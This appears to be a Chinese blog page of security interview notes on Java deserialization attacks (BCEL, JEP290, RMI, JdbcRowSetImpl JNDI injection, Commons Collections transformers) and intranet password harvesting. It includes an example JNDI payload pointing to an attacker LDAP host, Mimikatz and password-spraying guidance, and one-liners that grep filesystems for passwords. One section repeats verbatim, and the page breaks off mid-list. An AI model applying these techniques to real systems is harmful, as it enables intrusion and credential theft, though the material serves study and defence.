<li><strong>第三棒（<code>SerializableEventListener</code>）：</strong> 自动被触发，并调用下一步</li>
<li><strong>第四棒（反射调用）：</strong> 恶意代码被执行，如 <code>Runtime.exec(&quot;your_command&quot;)</code></li>
</ul>
<p>这个过程巧妙地绕过了黑名单，因为被直接反序列化的 <code>JmsEvent</code> 类本身是 WebLogic 内部的合法组件，并不在黑名单上</p>
<p><strong>3. BECL 利用链的使用条件</strong></p>
<p>要成功利用 BECL 攻击链，必须满足以下几个关键条件：</p>
<ol>
<li><strong>存在反序列化漏洞：</strong> 这是所有反序列化漏洞利用的前提。目标服务器必须存在一个可被攻击者控制的、未经验证的反序列化入口点。例如，<code>t3</code>、<code>IIOP</code> 等协议都是常见的反序列化入口点</li>
<li><strong>目标为 WebLogic Server：</strong> BECL 利用链的 Gadget Chain 是<strong>WebLogic 独有的</strong>。因为它依赖于 <code>com.bea.core.event</code> 这个特定于 WebLogic 的类库。因此，这个利用链不适用于 JBoss、Tomcat 或其他应用服务器</li>
<li><strong>未修补的 WebLogic 版本：</strong> 漏洞利用链通常依赖于特定版本的软件。BECL 链主要影响<strong>较早版本</strong>的 WebLogic Server，特别是那些已经部署了黑名单，但仍未修复此漏洞的版本</li>
<li><strong>可被利用的 JRE 类库：</strong> 尽管 BECL 的核心 Gadget 在 WebLogic 中，但它通常还需要依赖 Java 环境中的其他类，比如 <code>java.lang.reflect</code> 等，来完成反射调用</li>
</ol>
<hr>
<h3 id="BCEL-可以用其他类加载器吗"><a href="#BCEL-可以用其他类加载器吗" class="headerlink" title="BCEL 可以用其他类加载器吗"></a>BCEL 可以用其他类加载器吗</h3><h3 id="BCEL-与类加载器的关系"><a href="#BCEL-与类加载器的关系" class="headerlink" title="BCEL 与类加载器的关系"></a>BCEL 与类加载器的关系</h3><p>Java 类加载器（<code>ClassLoader</code>）负责在运行时将 <code>.class</code> 文件加载到 JVM 中。当一个类加载器加载字节码时，它会调用 <code>defineClass()</code> 方法，这个方法接受原始的字节码数据（一个字节数组），并将其转换为一个可用的 <code>Class</code> 对象</p>
<p>BCEL 正是在这个过程中发挥作用的。</p>
<ul>
<li><strong>步骤 1：恶意字节码生成</strong>：攻击者使用 BCEL 或其他字节码操作库，编写一段恶意的 Java 代码，例如一个可以执行系统命令的 Shellcode。然后，将这段 Java 代码编译成原始的<strong>字节码数组</strong></li>
<li><strong>步骤 2：编码和传输</strong>：为了绕过一些安全过滤，攻击者会使用 BCEL 提供的编码功能，将这个字节码数组编码成一个字符串。这种编码格式以 <code>$**BCEL$$</code> 开头，比如 <code>$**BCEL$$</code> + Base64 编码的字节码</li>
<li><strong>步骤 3：利用类加载器</strong>：攻击者找到一个存在漏洞的应用程序，该程序在处理用户输入时，会使用一个<strong>可以加载并执行字节码</strong>的类加载器。攻击者将前面编码好的 BCEL 字符串作为输入发送给应用程序</li>
<li><strong>步骤 4：解码和加载</strong>：应用程序在处理这个字符串时，会调用 <code>sun.misc.BASE64Decoder</code>（或其他解码器）来解码这个字符串，将其还原成原始的字节码数组。然后，应用程序会使用一个<strong>类加载器</strong>，调用其 <code>defineClass()</code> 方法，将这个字节码加载到内存中</li>
<li><strong>步骤 5：反射执行</strong>：一旦恶意字节码被加载成 <code>Class</code> 对象，攻击者就可以通过反射，调用其 <code>newInstance()</code> 方法来创建实例，并执行其中的恶意代码，从而实现远程代码执行</li>
</ul>
<p><strong>为什么需要其他类加载器？</strong></p>
<p>BCEL 漏洞利用链之所以成立，正是因为它<strong>间接利用</strong>了应用程序自身的类加载器。攻击者不需要自己上传一个类加载器，而是利用应用程序中已有的、可以加载字节码的类</p>
<p>例如，在一些特定的 Java 框架和库中，存在一些可以加载并执行字节码的类，比如：</p>
<ul>
<li><strong><code>com.sun.org.apache.bcel.internal.util.ClassLoader</code></strong>：这是 Java 内部自带的一个类加载器，它能够直接从 BCEL 编码的字符串中加载类</li>
<li><strong>自定义的类加载器</strong>：一些应用程序为了实现动态加载功能，可能会编写自己的类加载器。如果这些加载器没有做安全校验，同样可以被利用</li>
</ul>
<hr>
<h3 id="了解-JEP290-的原理吗"><a href="#了解-JEP290-的原理吗" class="headerlink" title="了解 JEP290 的原理吗"></a>了解 JEP290 的原理吗</h3><p><strong>JEP290 的核心原理：反序列化白名单和黑名单</strong></p>
<p>JEP290 没有从根本上重写 Java 的反序列化机制，而是在现有机制之上，增加了一个<strong>过滤层（Filter）</strong>。这个过滤层在反序列化数据之前，会先对即将被实例化的类进行检查</p>
<p>JEP290 的核心思想可以概括为：<strong>在反序列化过程中，根据一个可配置的白名单或黑名单，来决定哪些类可以被实例化</strong></p>
<p>它主要通过以下两种方式实现：</p>
<ol>
<li><strong>全局配置</strong>：在 JVM 启动时，可以通过设置系统属性来配置一个全局的过滤规则<ul>
<li><strong><code>jdk.serialFilter</code></strong>：这是最主要的系统属性。它的值是一个字符串，定义了允许或拒绝反序列化的类</li>
<li><strong>语法</strong>：这个字符串支持简单的通配符和规则，例如：<ul>
<li><code>java.util.Collections.*</code>：允许反序列化 <code>java.util.Collections</code> 包下的所有类</li>
<li><code>!org.apache.commons.collections.functors.InvokerTransformer</code>：<strong>禁止</strong>反序列化 <code>InvokerTransformer</code> 这个类</li>
<li><code>*</code>：默认值，表示允许所有类</li>
<li><code>;</code>：用于分隔多个规则</li>
</ul>
</li>
</ul>
</li>
<li><strong>编程控制</strong>：开发者可以在自己的代码中，通过 <code>ObjectInputStream</code> 类提供的 <code>setObjectInputFilter()</code> 方法，在运行时为特定的反序列化流设置一个临时的过滤器。这使得开发者可以根据自己的业务需求，对反序列化进行更精细的控制</li>
</ol>
<hr>
<h3 id="讲下-RMI-原理以及相关的漏洞"><a href="#讲下-RMI-原理以及相关的漏洞" class="headerlink" title="讲下 RMI 原理以及相关的漏洞"></a>讲下 RMI 原理以及相关的漏洞</h3><p><strong>1. RMI 原理</strong></p>
<p><strong>RMI（Remote Method Invocation）</strong>，是 Java 远程方法调用的缩写。简单来说，它是一种 Java 编程技术，允许你在一个 Java 虚拟机（JVM）上运行的代码，调用另一个不同 JVM 上的对象的方法。这使得分布式应用开发变得相对简单，因为你可以像调用本地对象一样调用远程对象的方法</p>
<p>RMI 的核心思想是存根（Stub）和骨架（Skeleton）</p>
<ul>
<li><strong>客户端（Client）</strong>：<ul>
<li><strong>存根（Stub）</strong>：这是一个本地代理对象，它实现了远程对象的接口。客户端调用远程方法时，实际上是在调用存根上的本地方法。存根负责将方法调用信息（方法名、参数等）打包，并发送给远程服务器</li>
</ul>
</li>
<li><strong>服务器端（Server）</strong>：<ul>
<li><strong>远程对象（Remote Object）</strong>：这是真正提供服务、执行方法的对象</li>
<li><strong>骨架（Skeleton）</strong>：一个中间层对象，它监听客户端的请求。当收到存根发来的请求时，骨架负责解析请求，找到相应的远程对象，调用其方法，并将结果打包返回给客户端</li>
</ul>
</li>
</ul>
<p><strong>RMI 工作流程</strong></p>
<ol>
<li><strong>注册</strong>：服务器端创建一个远程对象，并通过一个**注册中心（RMI Registry）**将其注册。注册中心会绑定远程对象和服务名，例如 <code>rmi://server:port/serviceName</code></li>
<li><strong>查找</strong>：客户端通过服务名向注册中心查找远程对象。注册中心会返回一个存根对象给客户端</li>
<li><strong>调用</strong>：客户端调用存根上的方法</li>
<li><strong>传输</strong>：存根将方法调用信息序列化并通过网络发送给服务器端的骨架</li>
<li><strong>执行</strong>：骨架反序列化信息，调用远程对象上的实际方法，并将结果序列化后返回</li>
<li><strong>返回</strong>：客户端的存根接收到结果并反序列化，然后返回给客户端</li>
</ol>
<p><strong>2. RMI 相关漏洞</strong></p>
<p>RMI 的安全问题主要源于其<strong>依赖 Java 对象的序列化和反序列化机制</strong>。这种机制本身就是高风险的，因为它默认信任所有传入的对象。攻击者可以利用这一特性，构造恶意的序列化对象，在反序列化时触发攻击</p>
<p><strong>漏洞一：RMI 序列化漏洞（反序列化漏洞）</strong></p>
<p>这是 RMI 最常见也是最危险的漏洞类型。</p>
<ul>
<li><strong>原理</strong>：在 RMI 的调用过程中，客户端和服务端会相互发送序列化的对象。攻击者可以利用这个机制，构造一个包含恶意 Payload 的序列化对象。当服务器在<strong>反序列化</strong>这个对象时，如果其所依赖的库中存在可被利用的 Gadget Chain（例如 <code>Apache Commons Collections</code>），就会导致远程代码执行（RCE）</li>
<li><strong>攻击利用</strong>：攻击者首先需要确定 RMI 服务器的地址和端口。然后，他们会使用工具（例如 <code>ysoserial</code>）来生成一个恶意的序列化 Payload。最后，通过向 RMI 接口发送这个 Payload，即可触发反序列化攻击</li>
<li><strong>影响</strong>：这是一种<strong>高危 RCE 漏洞</strong>，可以使攻击者在未授权的情况下完全控制服务器</li>
</ul>
<p><strong>漏洞二：RMI 弱口令漏洞</strong></p>
<ul>
<li><strong>原理</strong>：如果 RMI Registry 的管理接口存在弱口令，攻击者就可以登录并执行恶意操作</li>
<li><strong>攻击利用</strong>：攻击者可以尝试对 RMI Registry 的管理接口进行暴力破解或字典攻击。一旦获得权限，就可以修改、删除或注册恶意服务</li>
</ul>
<p><strong>漏洞三：RMI Registry 绑定漏洞</strong></p>
<ul>
<li><strong>原理</strong>：某些情况下，RMI Registry 允许任何客户端绑定新的远程对象。如果应用程序没有对这个功能进行严格的权限控制，攻击者就可以注册一个恶意的远程对象</li>
<li><strong>攻击利用</strong>：攻击者可以注册一个带有恶意方法的远程对象。然后，他们可以诱导受害者或通过其他方式调用这个恶意方法，从而实现攻击</li>
</ul>
<p><strong>漏洞四：RMI SSL&#x2F;TLS 证书验证漏洞</strong></p>
<ul>
<li><strong>原理</strong>：RMI 可以配置为使用 SSL&#x2F;TLS 进行安全通信。但如果客户端没有正确验证服务器的 SSL 证书，攻击者就可以进行<strong>中间人攻击（MitM）</strong>，从而窃取敏感信息或篡改通信内容</li>
</ul>
<hr>
<h3 id="JdbcRowSetImpl-如何触发的-JNDI-注入"><a href="#JdbcRowSetImpl-如何触发的-JNDI-注入" class="headerlink" title="JdbcRowSetImpl 如何触发的 JNDI 注入"></a>JdbcRowSetImpl 如何触发的 JNDI 注入</h3><p><strong>1. 核心原理：<code>setDataSourceName()</code> 与 JNDI</strong></p>
<p><code>com.sun.rowset.JdbcRowSetImpl</code> 是一个 JDK 自带的类，它实现了 <code>RowSet</code> 接口。<code>JdbcRowSetImpl</code> 的一个核心功能就是通过 <strong><code>DataSource</code></strong> 来连接数据库</p>
<ul>
<li><strong><code>DataSource</code></strong>：<code>DataSource</code> 是一个标准的 Java 接口，用于获取数据库连接。它通常通过 JNDI来查找和绑定</li>
<li><strong><code>setDataSourceName()</code></strong>：当调用 <code>JdbcRowSetImpl</code> 的 <code>setDataSourceName()</code> 方法时，它会设置一个 JNDI 查找名称</li>
<li><strong><code>connect()</code></strong>：当 <code>JdbcRowSetImpl</code> 尝试建立连接时，会调用 <code>connect()</code> 方法，这个方法会使用 <code>InitialContext</code> 类，对 <code>setDataSourceName()</code> 设置的名称进行 JNDI 查找</li>
</ul>
<p><strong>问题的关键在于</strong>：当 <code>InitialContext</code> 查找的 URL 指向一个<strong>远程的 RMI&#x2F;LDAP 服务器</strong>时，它会<strong>自动下载并加载</strong>服务器上绑定的 Java 对象</p>
<p><strong>2. 漏洞触发的完整过程</strong></p>
<p>攻击者就是利用这一点，将恶意服务器的地址作为 <code>DataSourceName</code>，让目标服务器在反序列化时，主动去下载和执行恶意代码</p>
<ol>
<li><p><strong>攻击者搭建恶意服务</strong>：</p>
<ul>
<li>攻击者首先需要搭建一个恶意的 <strong>LDAP 或 RMI 服务器</strong></li>
<li>在这个服务器上，攻击者会绑定一个恶意的 Java 对象。这个对象通常是一个**<code>Exploit.java</code>**文件，它包含了一个 <code>static</code> 静态代码块，可以在被加载时自动执行，例如执行 <code>Runtime.exec()</code> 命令</li>
</ul>
</li>
<li><p><strong>构造恶意 Payload</strong>：</p>
<ul>
<li>攻击者构造一个恶意的序列化 <code>JdbcRowSetImpl</code> 对象</li>
<li>在这个对象中，攻击者会利用反射等方法，将 <code>DataSourceName</code> 属性设置为恶意服务的地址</li>
<li>例如：<code>new JdbcRowSetImpl().setDataSourceName(&quot;ldap://&lt;攻击机IP&gt;:&lt;端口&gt;/Exploit&quot;)</code></li>
<li><strong>注意</strong>：这里的 <code>ldap://</code> 是 JNDI 查找的协议，<code>&lt;攻击机IP&gt;</code> 是攻击者服务器的地址，<code>Exploit</code> 是攻击者在服务器上绑定的恶意对象名</li>
</ul>
</li>
<li><p><strong>发送 Payload</strong>：</p>
<ul>
<li>攻击者将这个序列化后的 <code>JdbcRowSetImpl</code> 对象发送给存在反序列化漏洞的目标应用程序</li>
<li>这个过程可以是通过 HTTP 请求、文件上传或其他方式</li>
</ul>
</li>
<li><p><strong>目标服务器反序列化</strong>：</p>
<ul>
<li>目标应用程序接收到数据后，对 <code>JdbcRowSetImpl</code> 对象进行反序列化</li>
<li>在反序列化过程中，<code>JdbcRowSetImpl</code> 的 <code>readObject()</code> 方法被调用</li>
<li><code>readObject()</code> 方法会触发 <code>connect()</code> 方法的调用</li>
</ul>
</li>
<li><p><strong>触发 JNDI 注入</strong>：</p>
<ul>
<li><code>connect()</code> 方法会使用 <code>InitialContext</code> 对恶意地址 <code>ldap://&lt;攻击机IP&gt;:&lt;端口&gt;/Exploit</code> 进行 JNDI 查找</li>
<li>由于 <code>java.naming.factory.initial</code> 等配置，或者因为 JDK 版本过低，JVM 会无条件信任远程查找的结果</li>
<li>JVM 会连接到攻击者的 LDAP 服务器，下载并加载 <code>Exploit</code> 这个恶意对象</li>
<li>当 <code>Exploit</code> 对象被加载到内存时，其静态代码块会自动执行，从而执行攻击者预设的系统命令</li>
</ul>
<hr>
<h3 id="CC-链四个-Transformer-区别"><a href="#CC-链四个-Transformer-区别" class="headerlink" title="CC 链四个 Transformer 区别"></a>CC 链四个 Transformer 区别</h3></li>
</ol>
<p><strong>1. <code>InvokerTransformer</code></strong></p>
<p><code>InvokerTransformer</code> 是最核心、最通用、也最经典的 <code>Transformer</code></p>
<ul>
<li><strong>原理</strong>：它通过 <strong>Java 反射</strong>来调用一个对象的方法。在它的 <code>transform()</code> 方法中，你可以指定一个<strong>类名</strong>、<strong>方法名</strong>和<strong>方法参数</strong>。<code>InvokerTransformer</code> 会反射调用你指定的方法，并返回结果</li>
<li><strong>如何触发命令执行</strong>：<ol>
<li>指定类为 <code>java.lang.Runtime</code></li>
<li>指定方法为 <code>getMethod(&quot;getRuntime&quot;)</code></li>
<li>指定参数为空</li>
<li>这会返回 <code>Runtime</code> 的实例</li>
<li>然后，再用另一个 <code>InvokerTransformer</code> 来调用 <code>exec()</code> 方法执行命令</li>
</ol>
</li>
<li><strong>用途</strong>：它是 <code>CommonsCollections1</code> 利用链的核心组件。由于其功能过于强大和通用，它也是第一个被安全防御工具（如黑名单）重点关注和拦截的类。</li>
</ul>
<p><strong>2. <code>InstantiateTransformer</code></strong></p>
<p><code>InstantiateTransformer</code> 的功能是<strong>实例化一个新对象</strong></p>
<ul>
<li><strong>原理</strong>：它的 <code>transform()</code> 方法会根据你指定的类名，通过反射来调用其构造函数，从而创建一个新的对象实例</li>
<li><strong>如何触发命令执行</strong>：<ol>
<li>指定类为 <code>java.lang.Runtime</code></li>
<li>指定构造函数为 <code>getConstructor()</code></li>
<li>这会创建一个 <code>Runtime</code> 的实例</li>
<li>然后，再用 <code>InvokerTransformer</code> 来调用 <code>exec()</code> 方法</li>
</ol>
</li>
<li><strong>用途</strong>：它通常用于在没有 <code>Runtime</code> 实例的情况下，创建一个新的 <code>Runtime</code> 实例。它在某些特定的 Gadget Chain 中用于绕过对 <code>InvokerTransformer</code> 的直接调用</li>
</ul>
<p><strong>3. <code>ConstantTransformer</code></strong></p>
<p><code>ConstantTransformer</code> 是一个非常简单的 <code>Transformer</code></p>
<ul>
<li><strong>原理</strong>：它的 <code>transform()</code> 方法会<strong>直接返回一个你预先设置好的常量</strong>，而不进行任何额外的操作</li>
<li><strong>如何触发命令执行</strong>：它本身不能直接执行命令。它通常作为 Gadget Chain 中的<strong>辅助组件</strong>，用来提供一个常量值，比如提供一个 <code>Runtime</code> 实例<ol>
<li>创建 <code>ConstantTransformer</code>，并传入 <code>Runtime.getRuntime()</code> 的实例</li>
<li>当 <code>transform()</code> 方法被调用时，它会返回这个 <code>Runtime</code> 实例</li>
</ol>
</li>
<li><strong>用途</strong>：它常被用于组合其他 <code>Transformer</code>，为攻击链提供必要的对象实例。例如，在 <code>CommonsCollections4</code> 利用链中，它被用来提供 <code>Runtime</code> 实例，然后由 <code>InvokerTransformer</code> 来调用 <code>exec()</code></li>
</ul>
<p><strong>4. <code>ChainedTransformer</code></strong></p>
<p><code>ChainedTransformer</code> 的功能是将多个 <code>Transformer</code> <strong>串联起来</strong></p>
<ul>
<li><strong>原理</strong>：它的 <code>transform()</code> 方法会按顺序调用一个 <code>Transformer</code> 数组中的每一个 <code>Transformer</code>。第一个 <code>Transformer</code> 的输出会作为第二个 <code>Transformer</code> 的输入，以此类推</li>
<li><strong>如何触发命令执行</strong>：攻击者会将一个完整的攻击链（通常是 <code>ConstantTransformer</code> 和 <code>InvokerTransformer</code> 的组合）封装到一个 <code>ChainedTransformer</code> 中。当 <code>ChainedTransformer</code> 被反序列化时，它会按顺序调用这些 <code>Transformer</code>，最终触发命令执行</li>
<li><strong>用途</strong>：<code>ChainedTransformer</code> 是所有 <code>CommonsCollections</code> 利用链的<strong>核心驱动器</strong>。它扮演着“执行引擎”的角色，将整个多米诺骨牌串联起来，确保它们能按正确的顺序倒下</li>
</ul>
<table>
<thead>
<tr>
<th>Transformer</th>
<th>功能</th>
<th>在攻击链中的作用</th>
</tr>
</thead>
<tbody><tr>
<td>InvokerTransformer</td>
<td>反射调用方法</td>
<td>执行命令，是攻击链的核心</td>
</tr>
<tr>
<td>InstantiateTransformer</td>
<td>实例化对象</td>
<td>创建实例，通常用于创建 Runtime 实例</td>
</tr>
<tr>
<td>ConstantTransformer</td>
<td>返回常量值</td>
<td>提供常量对象，通常用于提供 Runtime 实例</td>
</tr>
<tr>
<td>ChainedTransformer</td>
<td>串联多个Transformer</td>
<td>驱动整个攻击链，按顺序执行每个 Transformer</td>
</tr>
</tbody></table>
<hr>
<h3 id="反序列化除了readObject-还有什么触发点"><a href="#反序列化除了readObject-还有什么触发点" class="headerlink" title="反序列化除了readObject 还有什么触发点"></a>反序列化除了readObject 还有什么触发点</h3><p><strong>1. <code>readResolve()</code> 和 <code>writeReplace()</code></strong></p>
<p>这两个方法主要用于控制对象的序列化和反序列化过程，它们可以用来触发攻击链</p>
<ul>
<li><strong>原理</strong>：<ul>
<li><code>writeReplace()</code>：这个方法在对象被序列化时调用。它允许开发者用另一个对象来替换即将被序列化的对象。攻击者可以利用这个方法，让一个无害的对象在序列化时被替换成一个恶意的对象</li>
<li><code>readResolve()</code>：这个方法在对象被反序列化后调用。它允许开发者用另一个对象来替换刚刚反序列化得到的对象。攻击者可以利用这个方法，在反序列化时触发攻击链，例如调用一个可以触发 JNDI 注入的类</li>
</ul>
</li>
<li><strong>攻击链举例</strong>：<ul>
<li>攻击者构造一个恶意的对象，这个对象的 <code>readResolve()</code> 方法被重写，用于返回一个可以触发 JNDI 注入的 <code>JdbcRowSetImpl</code> 对象</li>
<li>当应用程序反序列化这个对象时，<code>readResolve()</code> 方法会被自动调用，从而将攻击链的控制权转移到 <code>JdbcRowSetImpl</code> 上，最终导致 RCE</li>
</ul>
</li>
</ul>
<p><strong>2. <code>finalize()</code></strong></p>
<p><code>finalize()</code> 方法是一个“魔法”方法，它在对象被垃圾回收时调用</p>
<ul>
<li><strong>原理</strong>：在某些情况下，当一个对象被反序列化后，如果它不再被引用，Java 虚拟机（JVM）可能会将其放入垃圾回收队列。在垃圾回收前，JVM 会调用对象的 <code>finalize()</code> 方法</li>
<li><strong>攻击链举例</strong>：<ul>
<li>攻击者构造一个恶意的对象，这个对象的 <code>finalize()</code> 方法被重写，用于执行系统命令</li>
<li>当应用程序反序列化并丢弃这个对象时，如果垃圾回收被触发，<code>finalize()</code> 方法就会被调用，从而执行恶意代码</li>
</ul>
</li>
<li><strong>局限性</strong>：这种方法不常见，因为它<strong>不可预测</strong>。你无法控制垃圾回收何时发生，甚至无法保证它一定会发生。因此，它不是一个可靠的漏洞利用方式，但其原理是成立的</li>
</ul>
<p><strong>3. <code>toString()</code></strong></p>
<p>在某些情况下，某些类在反序列化时会调用其内部对象的 <code>toString()</code> 方法</p>
<ul>
<li><strong>原理</strong>：当一个对象被反序列化时，如果它被放入到一个需要调用 <code>toString()</code> 的上下文中（例如，在日志记录中），那么 <code>toString()</code> 方法就会被自动调用</li>
<li><strong>攻击链举例</strong>：<ul>
<li>攻击者找到一个类，它的 <code>toString()</code> 方法可以间接触发命令执行</li>
<li>攻击者构造一个恶意的序列化对象，这个对象包含上面找到的类</li>
<li>当应用程序反序列化这个对象，并将其放入一个需要调用 <code>toString()</code> 的上下文中时，就会触发攻击链</li>
<li>典型的例子是 <code>BadAttributeValueExpException</code> 这个类，它的 <code>readObject()</code> 方法会调用内部对象的 <code>toString()</code>，从而可以触发 <code>InvokerTransformer</code> 的攻击链</li>
</ul>
</li>
</ul>
<p><strong>4. <code>hashCode()</code> 和 <code>equals()</code></strong></p>
<p>这两个方法通常用于哈希表（<code>HashMap</code>、<code>HashSet</code>）等集合类中</p>
<ul>
<li><strong>原理</strong>：当一个哈希表被反序列化时，它需要重新构建内部的数据结构。在这个过程中，它会调用其存储的对象的 <code>hashCode()</code> 和 <code>equals()</code> 方法</li>
<li><strong>攻击链举例</strong>：<ul>
<li>攻击者构造一个恶意的哈希表，并向其中放入一个可以被利用的对象</li>
<li>当这个哈希表被反序列化时，它的 <code>hashCode()</code> 方法会被调用</li>
<li>攻击者可以利用一些特殊的类（例如 <code>HashSet</code>），让其在 <code>hashCode()</code> 方法中调用其他恶意对象的 <code>transform()</code> 方法，从而触发攻击链</li>
</ul>
</li>
</ul>
<h1 id="16-权限提升"><a href="#16-权限提升" class="headerlink" title="16- 权限提升"></a>16- 权限提升</h1><h3 id="反序列化除了readObject-还有什么触发点-1"><a href="#反序列化除了readObject-还有什么触发点-1" class="headerlink" title="反序列化除了readObject 还有什么触发点"></a>反序列化除了readObject 还有什么触发点</h3><p><strong>1. <code>readResolve()</code> 和 <code>writeReplace()</code></strong></p>
<p>这两个方法主要用于控制对象的序列化和反序列化过程，它们可以用来触发攻击链</p>
<ul>
<li><strong>原理</strong>：<ul>
<li><code>writeReplace()</code>：这个方法在对象被序列化时调用。它允许开发者用另一个对象来替换即将被序列化的对象。攻击者可以利用这个方法，让一个无害的对象在序列化时被替换成一个恶意的对象</li>
<li><code>readResolve()</code>：这个方法在对象被反序列化后调用。它允许开发者用另一个对象来替换刚刚反序列化得到的对象。攻击者可以利用这个方法，在反序列化时触发攻击链，例如调用一个可以触发 JNDI 注入的类</li>
</ul>
</li>
<li><strong>攻击链举例</strong>：<ul>
<li>攻击者构造一个恶意的对象，这个对象的 <code>readResolve()</code> 方法被重写，用于返回一个可以触发 JNDI 注入的 <code>JdbcRowSetImpl</code> 对象</li>
<li>当应用程序反序列化这个对象时，<code>readResolve()</code> 方法会被自动调用，从而将攻击链的控制权转移到 <code>JdbcRowSetImpl</code> 上，最终导致 RCE</li>
</ul>
</li>
</ul>
<p><strong>2. <code>finalize()</code></strong></p>
<p><code>finalize()</code> 方法是一个“魔法”方法，它在对象被垃圾回收时调用</p>
<ul>
<li><strong>原理</strong>：在某些情况下，当一个对象被反序列化后，如果它不再被引用，Java 虚拟机（JVM）可能会将其放入垃圾回收队列。在垃圾回收前，JVM 会调用对象的 <code>finalize()</code> 方法</li>
<li><strong>攻击链举例</strong>：<ul>
<li>攻击者构造一个恶意的对象，这个对象的 <code>finalize()</code> 方法被重写，用于执行系统命令</li>
<li>当应用程序反序列化并丢弃这个对象时，如果垃圾回收被触发，<code>finalize()</code> 方法就会被调用，从而执行恶意代码</li>
</ul>
</li>
<li><strong>局限性</strong>：这种方法不常见，因为它<strong>不可预测</strong>。你无法控制垃圾回收何时发生，甚至无法保证它一定会发生。因此，它不是一个可靠的漏洞利用方式，但其原理是成立的</li>
</ul>
<p><strong>3. <code>toString()</code></strong></p>
<p>在某些情况下，某些类在反序列化时会调用其内部对象的 <code>toString()</code> 方法</p>
<ul>
<li><strong>原理</strong>：当一个对象被反序列化时，如果它被放入到一个需要调用 <code>toString()</code> 的上下文中（例如，在日志记录中），那么 <code>toString()</code> 方法就会被自动调用</li>
<li><strong>攻击链举例</strong>：<ul>
<li>攻击者找到一个类，它的 <code>toString()</code> 方法可以间接触发命令执行</li>
<li>攻击者构造一个恶意的序列化对象，这个对象包含上面找到的类</li>
<li>当应用程序反序列化这个对象，并将其放入一个需要调用 <code>toString()</code> 的上下文中时，就会触发攻击链</li>
<li>典型的例子是 <code>BadAttributeValueExpException</code> 这个类，它的 <code>readObject()</code> 方法会调用内部对象的 <code>toString()</code>，从而可以触发 <code>InvokerTransformer</code> 的攻击链</li>
</ul>
</li>
</ul>
<p><strong>4. <code>hashCode()</code> 和 <code>equals()</code></strong></p>
<p>这两个方法通常用于哈希表（<code>HashMap</code>、<code>HashSet</code>）等集合类中</p>
<ul>
<li><p><strong>原理</strong>：当一个哈希表被反序列化时，它需要重新构建内部的数据结构。在这个过程中，它会调用其存储的对象的 <code>hashCode()</code> 和 <code>equals()</code> 方法</p>
</li>
<li><p><strong>攻击链举例</strong>：</p>
<ul>
<li>攻击者构造一个恶意的哈希表，并向其中放入一个可以被利用的对象</li>
<li>当这个哈希表被反序列化时，它的 <code>hashCode()</code> 方法会被调用</li>
<li>攻击者可以利用一些特殊的类（例如 <code>HashSet</code>），让其在 <code>hashCode()</code> 方法中调用其他恶意对象的 <code>transform()</code> 方法，从而触发攻击链</li>
</ul>
<hr>
<h3 id="内网抓取密码的话怎么抓"><a href="#内网抓取密码的话怎么抓" class="headerlink" title="内网抓取密码的话怎么抓"></a>内网抓取密码的话怎么抓</h3></li>
</ul>
<p><strong>1. 利用内存中的明文密码</strong></p>
<p>这是最直接、最有效的方法之一，尤其是在 Windows 主机上。许多服务和系统进程（如 lsass.exe）为了方便快速验证，会在内存中缓存用户的凭据信息，包括明文密码、哈希值等</p>
<p><strong>常用工具和技术：</strong></p>
<ul>
<li><strong>Mimikatz：</strong> 这是 Windows 环境下抓取密码的瑞士军刀。它可以从 <strong>lsass.exe</strong> 进程中提取各种凭据，包括：<ul>
<li><strong>明文密码（cleartext password）</strong>：如果用户以明文方式登录或者系统配置允许，Mimikatz 可以直接抓取到明文密码</li>
<li><strong>哈希值（NTLM hash）</strong>：即使没有明文密码，Mimikatz 也能抓取到用户的哈希值。这些哈希值可以用于哈希传递（Pass-the-Hash）攻击，在不知道明文密码的情况下登录其他机器</li>
<li><strong>Kerberos 票据（ticket）</strong>：可以用于哈希传递票据（Pass-the-Ticket）攻击</li>
</ul>
</li>
<li><strong>PowerSploit&#x2F;Mimikatz 的 PowerShell 版本：</strong> 在目标主机上执行 Mimikatz 时，如果担心被杀毒软件拦截，可以使用 PowerShell 版本。它不需要将 Mimikatz 可执行文件写入磁盘，而是直接在内存中执行</li>
</ul>
<p><strong>注意事项：</strong></p>
<ul>
<li>执行 Mimikatz 通常需要 <strong>管理员权限</strong> 或 <strong>SYSTEM 权限</strong></li>
<li>现在很多杀毒软件都会对 Mimikatz 采取强力防御，所以可能需要绕过（bypass）杀软</li>
</ul>
<p><strong>2. 利用服务和应用程序的配置文件</strong></p>
<p>许多服务（如数据库、Web 应用、FTP 服务器等）为了连接到其他主机或数据库，会在配置文件中存储用户名和密码，这些密码有时甚至是明文的</p>
<p><strong>常见的配置文件路径：</strong></p>
<ul>
<li><strong>数据库连接文件</strong>：例如 <code>web.config</code>、<code>wp-config.php</code>，或者其他 <code>*.ini</code>、<code>*.properties</code> 文件</li>
<li><strong>SSH 配置文件</strong>：Linux 系统中的 <code>.ssh/config</code> 或者 Windows 中的相关配置文件，有时会存储私钥或者密码</li>
<li><strong>FTP 客户端配置文件</strong>：例如 FileZilla、Xftp 等客户端软件的配置文件，可能会存储已连接过的服务器凭据</li>
<li><strong>应用程序配置文件</strong>：任何自定义的应用程序，其配置文件中都可能存储硬编码的密码</li>
</ul>
<p><strong>查找方法：</strong></p>
<ul>
<li>使用 <code>find</code> 命令（Linux）或 <code>dir</code> 命令（Windows）结合 <code>grep</code> 或 <code>findstr</code> 来搜索包含“password”或“user”等关键词的文件</li>
<li><code>find / -name &quot;*.conf&quot; | xargs grep &quot;password&quot;</code></li>
<li><code>dir /s /b *.ini | findstr /i password</code></li>
</ul>
<p><strong>3. 利用密码喷洒</strong></p>
<p>如果已经拿到了一份内网的用户列表，但不知道对应的密码，可以尝试使用一个或几个弱密码（如 <code>123456</code>、<code>password</code>、<code>P@ssword1</code>）去批量尝试登录所有用户</p>
<p><strong>优点：</strong></p>
<ul>
<li>可以绕过账户锁定策略。因为每次尝试登录时，都只对一个用户使用一个密码，而不是对一个用户使用多个密码</li>
<li>效率高，特别是在内网中存在大量使用弱密码的用户时</li>
</ul>
<p><strong>常用工具：</strong></p>
<ul>
<li><strong>Kerbrute：</strong> 用于 Kerberos 密码喷洒，速度快且不易被检测</li>
<li><strong>Hydra：</strong> 一个强大的在线密码破解工具，可以对各种服务（SSH, FTP, SMB 等）进行密码喷洒</li>
</ul>
<p><strong>4. 利用哈希传递攻击</strong></p>
<p>哈希传递攻击是一种非常强大的横向移动技术，它利用了 Windows 系统的一个特性：在进行 SMB 或其他网络认证时，可以直接使用用户的 NTLM 哈希值，而不需要知道明文密码</p>
<p><strong>基本流程：</strong></p>
<ol>
<li>在 A 主机上通过 Mimikatz 抓取到用户的哈希值</li>
